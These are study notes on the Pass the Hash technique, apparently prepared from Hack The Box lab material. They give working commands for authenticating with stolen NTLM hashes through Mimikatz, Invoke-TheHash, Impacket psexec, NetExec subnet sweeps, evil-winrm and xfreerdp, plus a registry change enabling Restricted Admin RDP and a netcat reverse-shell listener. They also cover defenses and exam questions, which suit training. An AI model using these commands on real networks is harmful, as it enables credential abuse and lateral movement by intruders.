# What is Pass the Hash (PtH)?

**Pass the Hash (PtH)** is a post-exploitation technique where an attacker authenticates using an **NTLM password hash** instead of the plaintext password.

The attacker **does not need to crack or know the actual password**.

Instead, the attacker simply presents the NTLM hash during authentication.

---

# Simple Explanation

Normally

```text
Password
      │
      ▼
Hash
      │
      ▼
Authentication
```

Pass the Hash

```text
Stolen NTLM Hash
        │
        ▼
Authentication
        │
        ▼
Access Granted
```

The password itself is never needed.

---

# Why Does Pass the Hash Work?

NTLM authentication uses the **NTLM hash directly** during the challenge-response process.

Because the hash remains **the same** until the password changes,

an attacker possessing the hash can authenticate successfully.

---

# Pass the Hash Workflow

```text
Compromise Host
        │
        ▼
Dump NTLM Hashes
        │
        ▼
Obtain Administrator Hash
        │
        ▼
Authenticate Using Hash
        │
        ▼
Remote Access
        │
        ▼
Lateral Movement
```

---

# Requirements for PtH

To perform Pass the Hash, an attacker generally needs:

✔ NTLM password hash

✔ Administrative privileges (to dump hashes)

✔ A service that accepts NTLM authentication

---

# Where Do NTLM Hashes Come From?

Common sources include:

```text
SAM Database
      │
      ▼
Local Administrator Hashes

-----------------------

NTDS.dit
      │
      ▼
Domain User Hashes

-----------------------

LSASS Memory
      │
      ▼
Cached Logon Credentials
```

---

# Hash Sources

|Source|Description|
|---|---|
|SAM|Local account hashes|
|NTDS.dit|Domain account hashes|
|LSASS|Credentials in memory|

---

# Example NTLM Hash

```text
64F12CDDAA88057E06A81B54E73B949B
```

This hash belongs to

```text
julio
```

inside

```text
inlanefreight.htb
```

---

# NTLM Authentication

Windows originally used **NTLM** before Kerberos became the default.

NTLM is still supported today for:

- Legacy systems
    
- Compatibility
    
- Older applications
    

---

# NTLM Authentication Flow

```text
Client
   │
   ▼
Username
   │
Challenge
   │
NTLM Hash
   │
Response
   │
Server
```

Notice:

The password is **never sent**.

Only the challenge response is sent.

---

# Why is NTLM Vulnerable?

Unlike modern password storage,

NTLM hashes are

```text
NOT SALTED
```

This allows

```text
Stolen Hash

↓

Authentication
```

without password recovery.

---

# Pass the Hash vs Password Cracking

|Pass the Hash|Password Cracking|
|---|---|
|Uses NTLM hash directly|Recovers plaintext password|
|Faster|Slower|
|No cracking required|Requires cracking|
|Immediate authentication|Depends on password strength|

---

# Windows Pass the Hash

Common Windows tools include:

✔ Mimikatz

✔ Invoke-TheHash

---

# Mimikatz

One of the most popular Windows credential attack tools.

PtH module

```text
sekurlsa::pth
```

---

# Mimikatz Workflow

```text
NTLM Hash
      │
      ▼
sekurlsa::pth
      │
      ▼
Spawn Process
      │
      ▼
Authenticated Session
```

---

# Required Parameters

|Parameter|Purpose|
|---|---|
|/user|Username|
|/rc4 or /NTLM|NTLM Hash|
|/domain|Domain|
|/run|Program to launch|

---

# Mimikatz Command

```cmd
mimikatz.exe privilege::debug ^
"sekurlsa::pth /user:julio ^
/rc4:64F12CDDAA88057E06A81B54E73B949B ^
/domain:inlanefreight.htb ^
/run:cmd.exe"
```

---

# Result

A new

```text
cmd.exe
```

runs under

```text
julio
```

using only the NTLM hash.

---

# Attack Diagram

```text
Mimikatz
      │
      ▼
NTLM Hash
      │
      ▼
cmd.exe
      │
      ▼
Authenticated Session
```

---

# Invoke-TheHash

PowerShell framework supporting PtH attacks.

Supports

✔ SMB

✔ WMI

---

# Invoke-TheHash Workflow

```text
PowerShell
      │
      ▼
Invoke-TheHash
      │
 ┌────┴─────────┐
 ▼              ▼
SMB          WMI
      │
      ▼
Execute Commands
```

---

# SMB Execution

Example

```powershell
Invoke-SMBExec `
-Target 172.16.1.10 `
-Domain inlanefreight.htb `
-Username julio `
-Hash 64F12CDDAA88057E06A81B54E73B949B `
-Command "whoami"
```

---

# Required Parameters

|Parameter|Description|
|---|---|
|Target|Target IP|
|Username|User|
|Domain|Domain|
|Hash|NTLM Hash|
|Command|Command to execute|

---

# SMB Attack Flow

```text
Authenticate
      │
      ▼
Create Service
      │
      ▼
Execute Command
      │
      ▼
Delete Service
```

---

# Reverse Shell using Invoke-TheHash

Workflow

```text
Attacker
      │
      ▼
Netcat Listener
      │
      ▼
Invoke-WMIExec
      │
      ▼
PowerShell Reverse Shell
      │
      ▼
Interactive Access
```

---

# Netcat Listener

```powershell
nc.exe -lvnp 8001
```

Waits for incoming reverse shell.

---

# WMI Execution

Invoke

```powershell
Invoke-WMIExec
```

to execute commands remotely using the NTLM hash.

---

# Linux Pass the Hash

Common tools

✔ Impacket

✔ NetExec

✔ evil-winrm

✔ xfreerdp

---

# Impacket

Impacket supports multiple PtH utilities.

```text
PsExec

WMIExec

SMBExec

ATExec
```

---

# Impacket Workflow

```text
NTLM Hash
      │
      ▼
PsExec
      │
      ▼
Upload Service
      │
      ▼
SYSTEM Shell
```

---

# Impacket PsExec

```bash
impacket-psexec administrator@TARGET \
-hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

---

# Other Impacket Tools

|Tool|Purpose|
|---|---|
|impacket-psexec|Service execution|
|impacket-wmiexec|WMI|
|impacket-smbexec|SMB|
|impacket-atexec|Scheduled Tasks|

---

# NetExec

NetExec automates authentication across many hosts.

Very useful for

✔ Password Reuse

✔ Lateral Movement

✔ Pass the Hash

---

# NetExec Workflow

```text
Subnet
     │
     ▼
Authenticate
     │
     ▼
Check Local Admin
     │
     ▼
Pwn3d!
```

---

# NetExec Example

```bash
netexec smb 172.16.1.0/24 \
-u Administrator \
-d . \
-H HASH
```

---

# Pwn3d!

When NetExec prints

```text
(Pwn3d!)
```

it means

```text
User

↓

Local Administrator

↓

Code Execution Possible
```

---

# Execute Commands

```bash
netexec smb TARGET \
-u Administrator \
-d . \
-H HASH \
-x whoami
```

---

# Password Reuse

Many companies deploy

```text
Golden Images
```

with identical

```text
Local Administrator Passwords
```

Result

```text
One Hash

↓

Many Machines
```

---

# LAPS

Microsoft recommends

```text
Local Administrator Password Solution
```

(LAPS)

Benefits

✔ Random passwords

✔ Automatic rotation

✔ Prevents password reuse

---

# evil-winrm

PowerShell Remoting using NTLM hashes.

---

# evil-winrm Workflow

```text
NTLM Hash
      │
      ▼
WinRM
      │
      ▼
PowerShell Session
```

---

# Command

```bash
evil-winrm \
-i TARGET \
-u Administrator \
-H HASH
```

---

# RDP Pass the Hash

GUI access is also possible.

Tool

```text
xfreerdp
```

---

# Requirement

Restricted Admin Mode must be enabled.

Registry

```text
HKLM\System\CurrentControlSet\Control\Lsa
```

Key

```text
DisableRestrictedAdmin
```

Value

```text
0
```

---

# Enable Restricted Admin

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa ^
/t REG_DWORD ^
/v DisableRestrictedAdmin ^
/d 0x0 ^
/f
```

---

# RDP PtH

```bash
xfreerdp \
/v:TARGET \
/u:julio \
/pth:HASH
```

---

# RDP Workflow

```text
NTLM Hash
      │
      ▼
xfreerdp
      │
      ▼
GUI Desktop
```

---

# UAC Limitation

User Account Control (UAC) restricts remote administration for local accounts.

Registry

```text
LocalAccountTokenFilterPolicy
```

---

# LocalAccountTokenFilterPolicy

|Value|Meaning|
|---|---|
|0|Only RID-500 Administrator allowed|
|1|Other local admins allowed|

---

# Important Exception

If

```text
FilterAdministratorToken
```

is enabled,

even the built-in Administrator account becomes subject to UAC restrictions,

which may prevent remote PtH.

---

# Complete Attack Flow

```text
Compromise Machine
        │
        ▼
Dump NTLM Hash
        │
        ▼
Choose Tool

──────────────

Windows

Mimikatz

Invoke-TheHash

──────────────

Linux

Impacket

NetExec

evil-winrm

xfreerdp

──────────────

        │
        ▼
Authenticate
        │
        ▼
Lateral Movement
```

---

# Tool Comparison

|Tool|Platform|Protocol|
|---|---|---|
|Mimikatz|Windows|Local Session|
|Invoke-TheHash|Windows|SMB / WMI|
|PsExec|Linux|SMB|
|WMIExec|Linux|WMI|
|SMBExec|Linux|SMB|
|ATExec|Linux|Scheduled Tasks|
|NetExec|Linux|SMB|
|evil-winrm|Linux|WinRM|
|xfreerdp|Linux|RDP|

---

# Important Commands

### Mimikatz

```cmd
sekurlsa::pth
```

---

### Invoke SMB

```powershell
Invoke-SMBExec
```

---

### Invoke WMI

```powershell
Invoke-WMIExec
```

---

### Impacket

```bash
impacket-psexec
```

---

### NetExec

```bash
netexec smb
```

---

### evil-winrm

```bash
evil-winrm
```

---

### FreeRDP

```bash
xfreerdp /pth
```

---

# Memory Tricks

### PtH Formula

```text
Password Hash

↓

Authentication

↓

No Password Needed
```

---

### Windows Tools

```text
Mimikatz

↓

Invoke-TheHash
```

---

### Linux Tools

```text
Impacket

↓

NetExec

↓

evil-winrm

↓

xfreerdp
```

---

### Hash Sources

```text
SAM

↓

NTDS.dit

↓

LSASS
```

---

# HTB / Exam Questions

### What is Pass the Hash?

✅ Authenticating with an **NTLM hash** instead of the plaintext password.

---

### Does PtH require cracking the password?

❌ No.

---

### Which Windows tool uses `sekurlsa::pth`?

✅ **Mimikatz**

---

### Which PowerShell tool supports SMB and WMI PtH?

✅ **Invoke-TheHash**

---

### Which Impacket tools support PtH?

✅ `impacket-psexec`, `impacket-wmiexec`, `impacket-smbexec`, `impacket-atexec`

---

### Which Linux tool shows **Pwn3d!** after successful authentication?

✅ **NetExec**

---

### Which Microsoft solution helps prevent local administrator password reuse?

✅ **LAPS (Local Administrator Password Solution)**

---

### Which tool provides PowerShell remoting using an NTLM hash?

✅ **evil-winrm**

---

### Which tool provides GUI access using PtH?

✅ **xfreerdp**

---

# 🔥 1-Minute Revision Sheet

```text
Pass the Hash (PtH)

        │
        ▼
Use NTLM Hash
        │
        ▼
Authenticate
        │
        ▼
No Password Needed

Hash Sources
────────────
SAM
NTDS.dit
LSASS

Windows Tools
─────────────
Mimikatz
Invoke-TheHash

Linux Tools
───────────
PsExec
WMIExec
SMBExec
ATExec
NetExec
evil-winrm
xfreerdp

Requirements
────────────
NTLM Hash
Administrative Rights
NTLM Authentication

Prevention
──────────
LAPS
Kerberos
Credential Guard
Disable NTLM
```

These notes preserve the important concepts, commands, parameters, workflows, registry settings, tools, and attack paths from your HTB material while adding diagrams ("pics"), comparisons, memory tricks, command explanations, and HTB/exam-focused summaries.